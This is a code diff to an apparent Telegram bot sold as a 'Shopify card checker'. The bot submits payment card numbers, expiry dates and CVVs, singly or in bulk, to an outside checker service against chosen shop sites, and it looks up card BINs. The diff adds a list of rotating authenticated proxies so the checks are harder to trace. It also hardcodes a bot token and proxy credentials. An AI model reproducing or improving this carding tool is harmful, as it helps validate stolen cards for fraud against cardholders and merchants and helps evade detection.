@@ -31,9 +31,26 @@ TELEGRAM_BOT_TOKEN = "7615802418:AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY" # Replace 
 CHECKER_API_URL = "https://sigmabro766.onrender.com/"
 BINLIST_API_URL = "https://lookup.binlist.net/"
 
-PROXY_LIST = [] # Proxies removed
+# --- Restored Proxy List ---
+PROXY_LIST = [
+    # The following proxy was causing SSL errors and has been disabled.
+    # "http://PP_2MX8KKO81J:soyjpcgu_country-us@ps-pro.porterproxies.com:31112",
+    "http://In2nyCyUORV4KYeI:yXhbVJozQeBVVRnM@geo.g-w.info:10080",
+    *[f"http://{p.split(':')[2]}:{p.split(':')[3]}@{p.split(':')[0]}:{p.split(':')[1]}" for p in [
+        "38.154.227.167:5868:dmeigyzw:5ece3v7xz8d2",
+        "198.23.239.134:6540:dmeigyzw:5ece3v7xz8d2",
+        "207.244.217.165:6712:dmeigyzw:5ece3v7xz8d2",
+        "107.172.163.27:6543:dmeigyzw:5ece3v7xz8d2",
+        "216.10.27.159:6837:dmeigyzw:5ece3v7xz8d2",
+        "142.147.128.93:6593:dmeigyzw:5ece3v7xz8d2",
+        "64.64.118.149:6732:dmeigyzw:5ece3v7xz8d2",
+        "136.0.207.84:6661:dmeigyzw:5ece3v7xz8d2",
+        "206.41.172.74:6634:dmeigyzw:5ece3v7xz8d2",
+        "104.239.105.125:6655:dmeigyzw:5ece3v7xz8d2",
+    ]]
+]
 
-# -- FINAL FIX: Removed 'Accept-Encoding' to prevent broken compressed responses from the API --
+# Removed 'Accept-Encoding' to force plain text responses and prevent parse errors
 COMMON_HTTP_HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Accept": "application/json, text/javascript, */*; q=0.01",
@@ -85,9 +102,13 @@ async def get_bin_details(bin_number):
 
     if not bin_number or len(bin_number) < 6: return create_error("Invalid BIN")
 
+    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
+    proxies = proxy if proxy else None
+    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"
+
     try:
         headers = {'Accept-Version': '3', **COMMON_HTTP_HEADERS}
-        async with httpx.AsyncClient(timeout=15.0) as client:
+        async with httpx.AsyncClient(proxies=proxies, timeout=15.0) as client:
             response = await client.get(f"{BINLIST_API_URL}{bin_number}", headers=headers)
 
         if response.status_code == 200:
@@ -97,17 +118,18 @@ async def get_bin_details(bin_number):
         else:
              return create_error(f"API Error {response.status_code}")
     except Exception as e:
-        logger.error(f"BIN lookup failed for {bin_number}: {e}")
+        logger.error(f"BIN lookup failed for {bin_number} via {proxy_host}: {e}")
         return create_error("Lookup Client Error")
 
 # --- Message Templates ---
 def generate_header(title):
     return f"<b>┌──────────────────────────────┐</b>\n<b>│  🚀 {title.upper()}  │</b>\n<b>└──────────────────────────────┘</b>\n"
 
-def generate_footer(user, time_taken=None):
+def generate_footer(user, time_taken=None, proxy=None):
     footer = f"\n<b>┌──────────────────────────────┐</b>\n"
     footer += f"<b>│  👤 User:</b> {html.escape(user.first_name)}\n"
     if time_taken: footer += f"<b>│  ⏱ Time:</b> {time_taken}s\n"
+    if proxy: footer += f"<b>│  🌐 Proxy:</b> {proxy}\n"
     footer += f"<b>│  🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</b>\n"
     footer += f"<b>└──────────────────────────────┘</b>"
     return footer
@@ -115,7 +137,7 @@ def generate_footer(user, time_taken=None):
 # --- Bot Commands ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    welcome_msg = generate_header("auto shopify checker") + f"<b>🔹 Welcome, {html.escape(user.first_name)}!</b>\n\n<i>Premium Shopify card checking utility.</i>\n\n<b>💎 Features:</b>\n├ Real-time checking\n├ BIN lookup\n├ Mass checker with site rotation\n└ Multi-site support\n\n<b>Choose an option below to get started:</b>"
+    welcome_msg = generate_header("auto shopify checker") + f"<b>🔹 Welcome, {html.escape(user.first_name)}!</b>\n\n<i>Premium Shopify card checking utility.</i>\n\n<b>💎 Features:</b>\n├ Real-time checking\n├ BIN lookup\n├ Mass checker with site rotation\n└ Multi-site & Proxy support\n\n<b>Choose an option below to get started:</b>"
     keyboard = [[InlineKeyboardButton("➕ Add Target Site", callback_data="site:prompt_add")], [InlineKeyboardButton("📊 Check Single Card", callback_data="nav:single_check"), InlineKeyboardButton("📁 Mass Check", callback_data="nav:mass_check")], [InlineKeyboardButton("📋 Commands", callback_data="nav:show_cmds"), InlineKeyboardButton("👨‍💻 Developer", url="https://t.me/alanjocc")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     if update.callback_query: await update.callback_query.message.edit_text(welcome_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
@@ -167,10 +189,14 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     start_time = time.time()
     cc_details_full = context.args[0]
     bin_data_task = asyncio.create_task(get_bin_details(cc_details_full.split('|')[0][:6]))
+    
+    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
+    proxies = proxy if proxy else None
+    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"
     params = {"site": user_sites[0], "cc": cc_details_full}
 
     try:
-        async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, timeout=45.0) as client:
+        async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, proxies=proxies, timeout=45.0) as client:
             response = await client.get(CHECKER_API_URL, params=params)
         api_data = parse_checker_api_response(response.text)
         if api_data:
@@ -202,7 +228,9 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ├ <b>Type:</b> <code>{bin_info_str}</code>
 ├ <b>Bank:</b> <code>{b.get('bank_name', 'N/A')}</code>
 └ <b>Country:</b> {b.get('country_emoji', '🌐')} <code>{b.get('country_name', 'N/A')}</code>
-""" + f"\n<b>🔹 Response:</b>\n<code>{html.escape(response_display[:400])}</code>" + generate_footer(update.effective_user, time_taken)
+"""
+    if b.get("error"): result_message += f"\n<b>BIN Error:</b> <code>{b['error']}</code>"
+    result_message += f"\n\n<b>🔹 Response:</b>\n<code>{html.escape(response_display[:400])}</code>" + generate_footer(update.effective_user, time_taken, proxy_host)
     await update.message.reply_text(result_message, parse_mode=ParseMode.HTML)
 
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -227,8 +255,10 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if card.count('|') != 3:
                 results.append(f"{card} -> INVALID FORMAT"); errors += 1; continue
             try:
+                proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
+                proxies = proxy if proxy else None
                 params = {"site": user_sites[site_index], "cc": card}
-                async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, timeout=30.0) as client:
+                async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, proxies=proxies, timeout=30.0) as client:
                     response = await client.get(CHECKER_API_URL, params=params)
                 api_data = parse_checker_api_response(response.text)
                 if api_data:
@@ -252,9 +282,10 @@ async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args or len(context.args[0]) < 6: return await update.message.reply_text("<b>Usage:</b> <code>/bin 123456</code>", parse_mode=ParseMode.HTML)
     await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
     bin_data = await get_bin_details(context.args[0][:6])
+    proxy_host = "Direct" # Since we don't know which proxy was used inside get_bin_details, we simplify here
     result_message = generate_header("bin information") + f"<b>🔹 BIN:</b> <code>{bin_data.get('bin', 'N/A')}</code>\n<b>🔹 Scheme:</b> <code>{bin_data.get('scheme', 'N/A')}</code>\n<b>🔹 Type:</b> <code>{bin_data.get('type', 'N/A')}</code>\n<b>🔹 Brand:</b> <code>{bin_data.get('brand', 'N/A')}</code>\n<b>🏦 Bank:</b> <code>{bin_data.get('bank_name', 'N/A')}</code>\n<b>🌍 Country:</b> {bin_data.get('country_emoji', '🌐')} <code>{bin_data.get('country_name', 'N/A')}</code>"
     if bin_data.get("error"): result_message += f"\n\n<b>⚠️ Error:</b> <code>{bin_data['error']}</code>"
-    result_message += generate_footer(update.effective_user)
+    result_message += generate_footer(update.effective_user) # Proxy info is not passed as it's internal to the function
     await update.message.reply_text(result_message, parse_mode=ParseMode.HTML)
 
 # --- Main Setup ---
